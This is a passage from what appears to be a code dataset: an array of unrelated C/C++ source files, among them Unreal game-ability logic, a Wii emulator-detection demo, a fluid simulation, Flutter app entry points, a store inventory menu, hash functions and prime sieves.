(Data.EvaluatedData.Attribute == GetHealthAttribute())\n\t{\n\t\tSetHealth(FMath::Clamp(GetHealth(), 0.0f, GetMaxHealth()));\n\t}\n\telse if (Data.EvaluatedData.Attribute == GetManaAttribute())\n\t{\n\t\tSetMana(FMath::Clamp(GetMana(), 0.0f, GetMaxMana()));\n\t}\n\tif (Data.EvaluatedData.Attribute == GetIncomingDamageAttribute())\n\t{\n\t\tconst float LocalIncomingDamage = GetIncomingDamage();\n\t\tSetIncomingDamage(0.0f);\n\t\tif (LocalIncomingDamage > 0.0f)\n\t\t{\n\t\t\t// Apply the damage to the target\n\t\t\t// \u9020\u6210\u4f24\u5bb3\n\t\t\tconst float NewHealth = GetHealth() - LocalIncomingDamage;\n\t\t\tSetHealth(FMath::Clamp(NewHealth, 0.0f, GetMaxHealth()));\n\n\t\t\tconst bool bFatal = GetHealth() <= 0.0f;\t// \u662f\u5426\u81f4\u547d\n\n\t\t\t// \u5982\u679c\u4e0d\u662f\u81f4\u547d\u7684\uff0c\u90a3\u4e48\u5c31\u6fc0\u6d3b\u8fd9\u4e2aAbility\n\t\t\tif (bFatal)\n\t\t\t{\n\t\t\t\t// \u521b\u5efa\u4e00\u4e2aTagContainer\uff0c\u5c06Effect_Fatal\u6807\u7b7e\u6dfb\u52a0\u8fdb\u53bb\n\t\t\t\tFGameplayTagContainer FatalTagContainer;\n\t\t\t\tFatalTagContainer.AddTag(FAuraGameplayTags::Get().Effect_DeathReact);\t// \u6dfb\u52a0\u81f4\u547d\u6807\u7b7e\n\t\t\t\tEffectProperties.TargetASC->TryActivateAbilitiesByTag(FatalTagContainer);\t// \u5c1d\u8bd5\u6fc0\u6d3b\u6807\u7b7e\u7684\u80fd\u529b\n\t\t\t\tif (ICombatInterface* CombatInterface = Cast<ICombatInterface>(EffectProperties.TargetAvatarActor))\n\t\t\t\t{\n\t\t\t\t\tCombatInterface->Die();\t// \u6b7b\u4ea1\n\t\t\t\t}\n\t\t\t\tSendEXPEvent(EffectProperties);\t// \u53d1\u9001\u7ecf\u9a8c\u4e8b\u4ef6\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t// \u521b\u5efa\u4e00\u4e2aTagContainer\uff0c\u5c06Effect_HitReact\u6807\u7b7e\u6dfb\u52a0\u8fdb\u53bb\n\t\t\t\tFGameplayTagContainer HitReactTagContainer;\n\t\t\t\tHitReactTagContainer.AddTag(FAuraGameplayTags::Get().Effect_HitReact);\t// \u6dfb\u52a0\u53d7\u51fb\u6807\u7b7e\n\t\t\t\tEffectProperties.TargetASC->TryActivateAbilitiesByTag(HitReactTagContainer);\t// \u5c1d\u8bd5\u6fc0\u6d3b\u6807\u7b7e\u7684\u80fd\u529b\n\t\t\t}\n\n\t\t\tShowFloatingText(\n\t\t\t\tEffectProperties, \n\t\t\t\tLocalIncomingDamage,\n\t\t\t\tUAuraAbilitySystemLibrary::IsBlockedHit(EffectProperties.EffectContextHandle),\n\t\t\t\tUAuraAbilitySystemLibrary::IsCriticalHit(EffectProperties.EffectContextHandle));\t// \u663e\u793a\u6d6e\u52a8\u6587\u5b57\n\t\t}\n\t}\n\n\tif (Data.EvaluatedData.Attribute == GetRewardExperienceAttribute())\n\t{\n\t\tconst float LocalRewardExperience = GetRewardExperience();\n\t\tSetRewardExperience(0.0f);\n\t\tif (LocalRewardExperience > 0.0f)\n\t\t{\n\t\t\tif (EffectProperties.SourceCharacter->Implements<UPlayerInterface>())\t// \u5982\u679c\u65bd\u6cd5\u8005\u5b9e\u73b0\u4e86IPlayerInterfac",
    "#include <wiiuse/wpad.h>\n\n#include <cstdio>\n#include <cstdlib>\n\nstatic constexpr size_t expectedTickDifference = 1;\n\nstatic void InitVideo();\n\nint main(int /* argc */, char * /* argv */[]) {\n    InitVideo();\n    WPAD_Init();\n\n    printf(\"\\x1b[2;0H\");\n    printf(\"Dolphin Anti-Emulation Techniques by MikeIsAStar\\n\\n\");\n\n    size_t tickDifference;\n    {\n        size_t startTick;\n        size_t endTick;\n\n        u32 interruptsEnabled = IRQ_Disable();\n        {\n            asm volatile(\"sync\");\n            asm volatile(\"mftbl %0\" : \"=r\"(startTick));\n            asm volatile(\"sync\");\n            asm volatile(\"mftbl %0\" : \"=r\"(endTick));\n            asm volatile(\"sync\");\n        }\n        IRQ_Restore(interruptsEnabled);\n\n        tickDifference = endTick - startTick;\n    }\n\n    const char *platform;\n    if (tickDifference != expectedTickDifference) {\n        platform = \"Emulator\";\n    } else {\n        platform = \"Console\";\n    }\n\n    printf(\"Platform: %s\", platform);\n\n    while (true) {\n        WPAD_ScanPads();\n\n        u32 buttonsDown = WPAD_ButtonsDown(0);\n        if (buttonsDown & WPAD_BUTTON_HOME) {\n            break;\n        }\n\n        VIDEO_WaitVSync();\n    }\n\n    return EXIT_SUCCESS;\n}\n\nstatic void InitVideo() {\n    VIDEO_Init();\n\n    GXRModeObj *renderMode = VIDEO_GetPreferredMode(NULL);\n    void *xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(renderMode));\n    CON_Init(xfb, 20, 20, renderMode->fbWidth, renderMode->xfbHeight,\n            renderMode->fbWidth * VI_DISPLAY_PIX_SZ);\n\n    VIDEO_Configure(renderMode);\n    VIDEO_SetNextFramebuffer(xfb);\n    VIDEO_SetBlack(false);\n    VIDEO_Flush();\n    VIDEO_WaitVSync();\n    if (renderMode->viTVMode & VI_NON_INTERLACE) {\n        VIDEO_WaitVSync();\n    }\n}\n",
    "/************************************************************************\n * MechSys - Open Library for Mechanical Systems                        *\n * Copyright (C) 2009 Sergio Galindo                                    *\n *                                                                      *\n * This program is free software: you can redistribute it and/or modify *\n * it under the terms of the GNU General Public License as published by *\n * the Free Software Foundation, either version 3 of the License, or    *\n * any later version.                                                   *\n *                                                                      *\n * This program is distributed in the hope that it will be useful,      *\n * but WITHOUT ANY WARRANTY; without even the implied warranty of       *\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the         *\n * GNU General Public License for more details.                         *\n *                                                                      *\n * You should have received a copy of the GNU General Public License    *\n * along with this program. If not, see <http://www.gnu.org/licenses/>  *\n ************************************************************************/\n// Sinking disks\n\n//STD\n#include<iostream>\n\n// MechSys\n#include <mechsys/lbm/Domain.h>\n\nstruct UserData\n{\n    double Kn;\n    Vec3_t g;\n    Vec3_t Xmin;\n    Vec3_t Xmax;\n};\n\nvoid Setup(LBM::Domain & dom, void * UD)\n{\n    UserData & dat = (*static_cast<UserData *>(UD));\n#ifdef USE_OMP\n    #pragma omp parallel for schedule(static) num_threads(dom.Nproc)\n#endif\n    for (size_t i=0;i<dom.Lat[0].Ncells;i++)\n    {\n        Cell * c   = dom.Lat[0].Cells[i];\n        c->BForcef = c->Rho*dat.g;\n        c          = dom.Lat[1].Cells[i];\n        c->BForcef = c->Rho*dat.g;\n    }\n    //for (size_t i=0;i<dom.Particles.Size();i++)\n    //{\n        //dom.Particles[i]->Ff = dom.Particles[i]->Props.m*dat.g;\n        //double delta;\n        //delta =   dat.Xmin(0) - dom.Particles[i]->x(0) + dom.Particles[i]->Props.R;\n        //if (delta > 0.0)  dom.Particles[i]->Ff(0) += dat.Kn*delta;\n        //delta = - dat.Xmax(0) + dom.Particles[i]->x(0) + dom.Particles[i]->Props.R;\n        //if (delta > 0.0)  dom.Particles[i]->Ff(0) -= dat.Kn*delta;\n        //delta =   dat.Xmin(1) - dom.Particles[i]->x(1) + dom.Particles[i]->Props.R;\n        //if (delta > 0.0)  dom.Particles[i]->Ff(1) += dat.Kn*delta;\n        //delta = - dat.Xmax(1) + dom.Particles[i]->x(1) + dom.Particles[i]->Props.R;\n        //if (delta > 0.0)  dom.Particles[i]->Ff(1) -= dat.Kn*delta;\n        //delta =   dat.Xmin(2) - dom.Particles[i]->x(2) + dom.Particles[i]->Props.R;\n        //if (delta > 0.0)  dom.Particles[i]->Ff(2) += dat.Kn*delta;\n        //delta = - dat.Xmax(2) + dom.Particles[i]->x(2) + dom.Particles[i]->Props.R;\n        //if (delta > 0.0)  dom.Particles[i]->Ff(2) -= dat.Kn*delta;\n    //}\n}\n\nint main(int argc, char **argv) try\n{\n    size_t Nproc = 1; \n    if (argc==2) Nproc=atoi(argv[1]);\n    size_t nx = 100;\n    size_t ny = 100;\n    size_t nz = 100;\n    double nu = 0.01;\n    double dx = 1.0;\n    double dt = 1.0;\n    double rho= 3000.0;\n    \n    Array<double> Nu(2);\n    Nu[0] = nu;\n    Nu[1] = nu;\n\n    LBM::Domain Dom(D3Q15, Nu, iVec3_t(nx,ny,nz), dx, dt);\n    UserData dat;\n    Dom.UserData = &dat;\n    Dom.Step = 1;\n    Dom.Lat[0].G    = -200.0;\n    Dom.Lat[0].Gs   = -0.0;\n    Dom.Lat[1].G    = 0.0;\n    Dom.Lat[1].Gs   = 0.0;\n    Dom.Gmix        =  0.001;\n    dat.g           = 0.0,-0.001,0.0;\n    dat.Xmin        = 0.0,0.0,0.0;\n    dat.Xmax        = nx*dx,ny*dx,nz*dx;\n    dat.Kn          = 1.0e4*rho/500.0;\n\n    //Set solid boundaries\n    for (size_t i=0;i<nx;i++)\n    for (size_t j=0;j<nz;j++)\n    {\n        Dom.Lat[0].GetCell(iVec3_t(i,0   ,j))->IsSolid = true;\n        Dom.Lat[0].GetCell(iVec3_t(i,ny-1,j))->IsSolid = true;\n        Dom.Lat[1].GetCell(iVec3_t(i,0   ,j))->IsSolid = true;\n        Dom.Lat[1].GetCell(iVec3_t(i,ny-1,j))->IsSolid = true;\n    }\n    for (size_t i=0;i<nx;i++)\n    for (size_t j=0;j<ny;j++)\n    {\n        Dom.Lat[0].GetCell(iVec3_t(i,j,0   ))->IsSolid = true;\n        Dom.Lat[0].GetCell(iVec3_t(i,j,nz-1))->IsSolid = true;\n        Dom.Lat[0].GetCell(iVec3_t(0   ,j,i))->IsSolid = true;\n        Dom.Lat[0].GetCell(iVec3_t(nx-1,j,i))->IsSolid = true;\n        Dom.Lat[1].GetCell(iVec3_t(i,j,0   ))->IsSolid = true;\n        Dom.Lat[1].GetCell(iVec3_t(i,j,nz-1))->IsSolid = true;\n        Dom.Lat[1].GetCell(iVec3_t(0   ,j,i))->IsSolid = true;\n        Dom.Lat[1].GetCell(iVec3_t(nx-1,j,i))->IsSolid = true;\n    }\n\n    for (int i=0;i<nx;i++)\n    for (int j=0;j<ny;j++)\n    for (int k=0;k<nz;k++)\n    {\n        Vec3_t v0(0.0,0.0,0.0);\n        //if (j<0.6*ny)\n        if (j<ny/2.0)\n        {\n            Dom.Lat[0].GetCell(iVec3_t(i,j,k))->Initialize(2300.0,v0);\n            //Dom.Lat[0].GetCell(iVec3_t(i,j,k))->Initialize(3000.0,v0);\n            Dom.Lat[1].GetCell(iVec3_t(i,j,k))->Initialize(0.01  ,v0);\n        }\n        else\n        {\n ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"square_loader\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cctype>\n#include \"Tienda.h\"\n#include \"Producto.h\"\n#include \"ProductoAlimenticio.h\"\n#include \"ProductoElectronico.h\"\n#include <sstream>\n\nbool contieneSoloLetras(const std::string& str) {\n    for (char c : str) {\n        if (!std::isalpha(c)) {\n            return false;\n        }\n    }\n    return true;\n}\nbool contieneSoloDigitos(const std::string& str) {\n    for (char c : str) {\n        if (!std::isdigit(c)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nbool esNumeroDecimal(const std::string& str) {\n    std::istringstream iss(str);\n    double temp;\n    iss >> std::noskipws >> temp;\n    return iss.eof() && !iss.fail();\n}\n\n\nint main() {\n    Tienda tienda;\n\n    int opcion;\n    do {\n        //Menu Principal del programa\n        std::cout << \"\\n=== MENU ===\" << std::endl;\n        std::cout << \"1. Agregar Producto\" << std::endl;\n        std::cout << \"2. Eliminar Producto\" << std::endl;\n        std::cout << \"3. Buscar Producto\" << std::endl;\n        std::cout << \"4. Mostrar Inventario\" << std::endl;\n        std::cout << \"5. Filtrar Productos por Precio\" << std::endl;\n        std::cout << \"6. Copiar Producto\" << std::endl;\n        std::cout << \"7. Salir\" << std::endl;\n        std::cout << \"Seleccione una opcion:\\n \";\n        std::cin >> opcion;\n\n        switch (opcion) {\n            case 1: {\n                //Agregar producto\n                std::string idStr;\n                int id;\n                std::string nombre;\n                std::string precioStr;\n                double precio;\n                int stock;\n                std::string fechaCaducidad;\n                std::string modelo;\n                int tipoProducto;\n                //Menu de tipo de productos\n                do {\n                    std::cout << \"Ingrese el tipo de producto\\n 1-Producto\\n 2-Producto Alimenticio\\n 3-Producto Electronico\\nSeleccione una opcion:\\n \";\n                    std::cin >> tipoProducto;\n                } while (tipoProducto < 1 || tipoProducto > 3);\n                //Pedir al usuario q ingrese el ID del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el ID del producto:\\n \";\n                    std::cin >> idStr;\n                    if (!contieneSoloDigitos(idStr)) {\n                        std::cerr << \"El ID del producto debe contener solo digitos.\" << std::endl;\n                    }\n                } while (!contieneSoloDigitos(idStr));\n\n                // Convertir la cadena de ID a entero\n                id = std::stoi(idStr);\n\n                // Pedir al usuario q ingrese el nombre hasta q contenga solo letras\n                do {\n                    std::cout << \"Ingrese el nombre del producto:\\n \";\n                    std::cin >> nombre;\n                    if (!contieneSoloLetras(nombre)) {\n                        std::cerr << \"El nombre del producto debe contener solo letras.\" << std::endl;\n                    }\n                } while (!contieneSoloLetras(nombre));\n                //Pedir al usuario q ingrese el precio del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el precio del producto:\\n \";\n                    std::cin >> precioStr;\n                    if (!esNumeroDecimal(precioStr)) {\n                        std::cerr << \"El precio del producto debe ser un numero.\" << std::endl;\n                    }\n                } while (!esNumeroDecimal(precioStr));\n                precio = std::stod(precioStr); // Convertir la cadena de precio a double\n                //Pedir al usuario q ingrese el stock del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el stock del producto:\\n \";\n                    std::cin >> stock;\n                    if (!esNumeroDecimal(std::to_string(stock))) {\n                        std::cerr << \"El stock del producto debe ser un n\u00famero entero.\" << std::endl;\n                    }\n                } while (!esNumeroDecimal(std::to_string(stock)));\n\n                if (tipoProducto == 2) {\n                    std::cout << \"Ingrese la fecha de caducidad del producto alimenticio: \";\n                    std::cin >> fechaCaducidad;\n                    tienda.agregarProducto(new ProductoAlimenticio(id, nombre, precio, stock, fechaCaducidad));\n                } else if (tipoProducto == 3) {\n                    std::cout << \"Ingrese el modelo del producto electronico: \";\n                    std::cin >> modelo;\n                    tienda.agregarProducto(new ProductoElectronico(id, nombre, precio, stock, modelo));\n                } else {\n                    tienda.agregarProducto(new Producto(id, nombre, precio, stock));\n                }\n\n                break;\n            }\n            case 2: {\n                int id;\n                std::cout << \"Ingrese el ID del producto a eliminar:\\n \";\n                std::cin >> id;\n                tienda.eliminarProducto(id);\n            ",
    "#include \"hashtable.h\"\n\nstatic inline uint32_t Ror (uint32_t num, int shift);\nstatic inline uint32_t Rol (uint32_t num, int shift);\n\nuint32_t HashZero (const char* /*word*/, size_t /*len*/)\n{\n    return 0;\n}\n\nuint32_t HashFirstLetter (const char* word, size_t /*len*/)\n{\n    assert (word);\n\n    return (uint32_t) word[0];\n}\n\nuint32_t HashStrlen (const char* /*word*/, size_t len)\n{\n    return (uint32_t) len;\n}\n\nuint32_t HashAsciiSum (const char* word, size_t len)\n{\n    assert (word);\n\n    uint32_t sum = 0;\n    for (size_t i = 0; i < len; i++) sum += (uint32_t) word[i];\n\n    return sum;\n}\n\nuint32_t HashAsciiSumDivStrlen (const char* word, size_t len)\n{\n    assert (word);\n\n    uint32_t sum = HashAsciiSum (word, len);\n\n    return sum / (uint32_t) len;\n}\n\nuint32_t HashRor (const char* word, size_t len)\n{\n    assert (word);\n\n    uint32_t hash_value = 0;\n    for (size_t i = 0; i < len; i++) hash_value = Ror (hash_value, 1) ^ (uint32_t) word[i];\n\n    return hash_value;\n}\n\nuint32_t HashRol (const char* word, size_t len)\n{\n    assert (word);\n\n    uint32_t hash_value = 0;\n    for (size_t i = 0; i < len; i++) hash_value = Rol (hash_value, 1) ^ (uint32_t) word[i];\n\n    return hash_value;\n}\n\nstatic inline uint32_t Ror (uint32_t num, int shift)\n{\n    return (num >> shift) | (num << ((int) sizeof (num) * 8 - shift));\n}\n\nstatic inline uint32_t Rol (uint32_t num, int shift)\n{\n    return (num << shift) | (num >> ((int) sizeof (num) * 8 - shift));\n}\n\n// -----------------------------------------------------------------------------\n// ---------------------------- Crc32 hash -------------------------------------\n// -----------------------------------------------------------------------------\n\nconst uint32_t crc32_tab[] = {\n\t0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,\n\t0xe963a535, 0x9e6495a3,\t0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,\n\t0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,\n\t0xf3b97148, 0x84be41de,\t0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,\n\t0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,\t0x14015c4f, 0x63066cd9,\n\t0xfa0f3d63, 0x8d080df5,\t0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,\n\t0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,\t0x35b5a8fa, 0x42b2986c,\n\t0xdbbbc9d6, 0xacbcf940,\t0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,\n\t0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,\n\t0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,\n\t0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,\t0x76dc4190, 0x01db7106,\n\t0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,\n\t0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,\n\t0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,\n\t0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,\n\t0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,\n\t0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,\n\t0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,\n\t0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,\n\t0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,\n\t0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,\n\t0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,\n\t0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,\n\t0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,\n\t0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,\n\t0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,\n\t0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,\n\t0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,\n\t0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,\n\t0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,\n\t0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,\n\t0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,\n\t0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,\n\t0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,\n\t0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,\n\t0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,\n\t0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,\n\t0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,\n\t0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,\n\t0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,\n\t0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,\n\t0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,\n\t0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d\n};\n\n\nuint32_t HashCrc32(const char* word, size_t len)\n{\n    uint32_t crc = 0;\n\n    crc = 0xFFFFFFFF;\n\n    for (size_t i = 0; i < len; i++)\n    {\n        crc =",
    "#include \"Ndef.h\"\n\n// Borrowed from Adafruit_NFCShield_I2C\nvoid PrintHex(const byte * data, const long numBytes)\n{\n  uint32_t szPos;\n  for (szPos=0; szPos < numBytes; szPos++)\n  {\n    Serial.print(\"0x\");\n    // Append leading 0 for small values\n    if (data[szPos] <= 0xF)\n      Serial.print(\"0\");\n    Serial.print(data[szPos]&0xff, HEX);\n    if ((numBytes > 1) && (szPos != numBytes - 1))\n    {\n      Serial.print(\" \");\n    }\n  }\n  Serial.println(\"\");\n}\n\n// Borrowed from Adafruit_NFCShield_I2C\nvoid PrintHexChar(const byte * data, const long numBytes)\n{\n  uint32_t szPos;\n  for (szPos=0; szPos < numBytes; szPos++)\n  {\n    // Append leading 0 for small values\n    if (data[szPos] <= 0xF)\n      Serial.print(\"0\");\n    Serial.print(data[szPos], HEX);\n    if ((numBytes > 1) && (szPos != numBytes - 1))\n    {\n      Serial.print(\" \");\n    }\n  }\n  Serial.print(\"  \");\n  for (szPos=0; szPos < numBytes; szPos++)\n  {\n    if (data[szPos] <= 0x1F)\n      Serial.print(\".\");\n    else\n      Serial.print((char)data[szPos]);\n  }\n  Serial.println(\"\");\n}\n\n// Note if buffer % blockSize != 0, last block will not be written\nvoid DumpHex(const byte * data, const long numBytes, const unsigned int blockSize)\n{\n    int i;\n    for (i = 0; i < (numBytes / blockSize); i++)\n    {\n        PrintHexChar(data, blockSize);\n        data += blockSize;\n    }\n}\n",
    "//\n// Created by CZQ on 2024/4/4.\n//\n\n#include \"bits/stdc++.h\"\n\nusing namespace std;\n\nclass PrimeEhrilich{\nprivate:\n    vector<bool> mIsPrime;\npublic:\n    PrimeEhrilich(int n):mIsPrime(n, true){\n        mIsPrime[0] = mIsPrime[1] = false;\n        for(int i=2; i<n; i++){\n            if(mIsPrime[i]){\n                int m=2;\n                while (m*i < mIsPrime.size()){\n                    mIsPrime[m*i] = false;\n                    m++;\n                }\n            }\n        }\n    }\n    bool isPrime(int x)const{\n        return mIsPrime.at(x);\n    }\n};\nvector<int> isPrimeEhrlich(int a){\n    vector<bool> vis(a);\n    vector<int> primes;\n    vis[0] = vis[1] = true;\n    for (int i = 2; i < a; ++i) {\n        if(!vis[i])\n            primes.emplace_back(i);\n        for (int j = 2; j * i <= a ; ++j) {\n            vis[j*i] = true;\n        }\n    }\n    return primes;\n}\n\n\nvector<int> isPrimeEuler(int a){\n    vector<bool> vis(a);\n    vector<int> primes;\n    vis[0] = vis[1] = true;\n\n    for (int i = 2; i < a; ++i) {\n        if(!vis[i])\n            primes.emplace_back(i);\n        for (int j = 0; j < primes.size(); ++j) {\n\n            if (i*primes[j] > a)\n                break;\n\n            vis[i * primes[j]] = true;\n\n//            \u5982\u679ci\u542b\u6709\u6700\u5c0f\u7d20\u6570\u56e0\u6570 prime[j] \u540e\uff0c\u5219\u540e\u9762\u7684\u5faa\u73af\u5230\u7684 i' * prime[j] \u5fc5\u80fd\u4ee3\u66ff i * prime[j+1] \uff0c\u4e14 i' % prime[j] != 0\n            if (i % primes[j] == 0)\n                break;\n        }\n    }\n    return primes;\n}\n\nbool is_prim(int n){\n    int i;\n    if (n < 2)\n        return false;\n    else if (n == 2)\n        return true;\n    else\n    {\n        for (i = 2; i <= (int)sqrt(n) + 1; i++)\n        {\n            if (n % i == 0)\n                return false;\n        }\n    }\n    return true;\n}\nint main(){\n\n    ios::sync_with_stdio(0),cin.tie(0),cout.tie(0);\n    int a,num;\n    vector<int> nums;\n    cin >> a >> num;\n    for (int i = 0; i < num; ++i) {\n        int tmp;\n        cin >> tmp;\n        nums.emplace_back(tmp);\n    }\n\n    vector<int> res;\n    res = isPrimeEuler(a);\n    for (int i = 0; i < num; ++i) {\n        cout << res[nums[i]-1] << '\\n';\n    }\n\n\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"firstapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"SDL_handler.h\"\n#include \"bg_entity_type.h\"\n#include \"components.h\"\n#include \"enemy_type.h\"\n#include \"entity_id.h\"\n#include \"entity_type.h\"\n#include \"mPrint.h\"\n#include \"powerup_type.h\"\n#include <SDL.h>\n#include <SDL_joystick.h>\n#include <map>\n#include <random>\n#include <string>\n#include <unordered_map>\n#include <vector>\n\nusing std::default_random_engine;\nusing std::map;\nusing std::mt19937;\nusing std::random_device;\nusing std::string;\nusing std::uniform_real_distribution;\nusing std::unordered_map;\nusing std::vector;\n\nrandom_device rd;\nmt19937 g;\n\nunordered_map<string, size_t> config;\n\nint DEBUG_TEXT_WRAP_LEN = 2048;\n\ndouble zoom = 1.0; // has to appear\n\nchar texture_text[1024] = \"texture_text\";\nchar stopwatch_text[128] = \"stopwatch_text\";\n\nbool quit = false;\nbool do_render_debug_panel = false;\nbool is_fullscreen = true;\nbool is_paused = false;\nbool is_gameover = false;\n\nint cooldown_min = -1;\nint window_width = -1;\nint window_height = -1;\nint default_knife_speed = 4;\nint current_knife_speed = default_knife_speed;\nint current_soulshard_magnetism_threshold = 100;\nint default_knife_cooldown = 30;\nint knife_cooldown = 0;\nint current_knife_cooldown = default_knife_cooldown;\nint default_player_speed = 8;\nint current_player_speed = default_player_speed;\nint num_collisions = 0;\nint img_flags = IMG_INIT_PNG;\nint result = -1;\nint w = 0;\nint h = 0;\n\nint total_frame_count = 0;\nint current_frame_count = 0;\n\nint frame_count = 0;\n\nint mWidth = -1;\nint mHeight = -1;\nint 